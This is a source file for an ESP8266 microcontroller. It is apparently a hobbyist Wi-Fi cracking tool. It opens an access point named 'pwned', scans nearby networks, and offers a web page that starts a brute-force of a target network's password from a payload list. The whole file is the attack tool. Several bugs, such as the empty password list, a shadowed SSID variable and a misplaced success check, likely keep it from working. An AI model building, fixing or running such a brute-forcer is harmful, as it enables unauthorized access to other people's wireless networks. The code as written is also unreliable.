#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <vector>
#include <string>

#include "globalVar.h"

ESP8266WebServer server(80);

const char* apSsid = "pwned";
const char* apPassword = "password";

extern std::string htmlHome;
std::vector<String> storeNetworks;
std::vector<String> crckpayload;

String ssidPass;
String targetPass;
String inputSsid;

int n;


void handleRoot() {
  server.send(200, "text/html", htmlHome.c_str());}

void inputHandler() {
  if (server.hasArg("targetSsid")) {
    String inputSsid = server.arg("targetSsid");
    Serial.println("Received input: " + inputSsid);
    server.send(200, "text/plain", "200 ok" + inputSsid);
    Serial.println("bruteforce has started");
  } else {
    server.send(400, "text/plain", "error 400");
  }
}

void wifiScan(){

  int n = WiFi.scanNetworks();
  if (n == 0) {
    Serial.println("No networks found");
  } else {    
    Serial.print(n);
    Serial.println(" networks found");
    for (int i = 0; i < n; ++i) {
      Serial.print(i + 1);
      Serial.print(": ");
      Serial.print(WiFi.SSID(i));
      delay(10);
      storeNetworks.push_back(WiFi.SSID(i));
      Serial.println(" ");
      delay(1000);
     }
    }
  }   
void printScannedNet(){
  for (String value : storeNetworks){
    Serial.println(value);
  }
}

void bruteForce(){
  Serial.println("inside bruteforce");//////
  const char* ssid = server.arg("targetSsid").c_str();

    char currentPass[64] = {0};

      for(int i = 0;i<101;++i){
        strncpy(currentPass, crckpayload[i].c_str(), sizeof(currentPass)-1);
        Serial.printf("Testing : %s, %s \n", ssid, currentPass);
        WiFi.begin(inputSsid, currentPass);
        delay(1000); // 1 sec
      }
    unsigned long start = millis();
    while (WiFi.status() == WL_DISCONNECTED && 
          millis() - start < 3000) {
      delay(1000);
      yield();
    }
    if (WiFi.status() == WL_CONNECTED) {
      Serial.println("Success!");
      String ssidPass = targetPass;
      Serial.print(ssidPass);
      Serial.println(" ");
      WiFi.disconnect();
      return;
    }
    
    WiFi.disconnect();
    delay(100);
  }

void passwordFound(){
          String response = "<html><body><h1>Connecting to " + ssidPass + "</h1></body></html>";
          server.send(200, "text/html", response);
          Serial.println("password found: ");
          Serial.print(ssidPass);
      }

void monitorMode(){
  String html1 = "<html><head><title>ESP8266 Data</title></head><body>";
  html1 += "<h1>Wi-Fi Scan Results</h1>";
  html1 += "<p>Found " + String(n) + " networks:</p>";
  html1 += "<ul>";
  
  for (const auto& network : storeNetworks) {
    html1 += "<li>" + network + "</li>";
  }
  
  html1 += "</ul>";
  html1 += "</body></html>";
  
  server.send(200, "text/html", html1);
}


void setup() {
  Serial.begin(115200); // pls dont touch this sec
  delay(50);

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(apSsid, apPassword);
  Serial.println("\nConnected, IP: " + WiFi.softAPIP().toString()); /// pls dont touch 
  
  server.on("/", handleRoot);
  server.on("/input", inputHandler);
  server.on("/monitor", monitorMode);
  server.on("/checkPass", bruteForce);

  server.begin();
  Serial.println("Web server started");

  wifiScan();
  Serial.println("Scanning for Wifi (5 Sec)");
  delay(5000);
  printScannedNet();
}


void loop() {
  server.handleClient();
}